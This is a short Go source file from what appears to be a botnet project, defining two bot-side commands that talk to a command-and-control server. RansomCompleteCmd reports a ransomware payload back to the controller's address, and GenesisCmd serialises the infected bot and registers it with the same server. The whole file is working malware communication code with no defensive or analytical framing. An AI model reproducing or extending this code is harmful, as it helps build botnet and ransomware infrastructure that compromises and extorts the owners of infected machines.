package tcp

import (
	"github.com/rodzzlessa24/botnet"
)

//RansomCompleteCmd is
func (b *BotService) RansomCompleteCmd(payload []byte) error {
	return sendData(b.Bot.CCAddr, payload)
}

//GenesisCmd is
func (b *BotService) GenesisCmd(bot *botnet.Bot) error {
	buff, err := bot.Bytes()
	if err != nil {
		return err
	}

	data := append(commandToBytes("genesis"), buff...)

	return sendData(b.Bot.CCAddr, data)
}
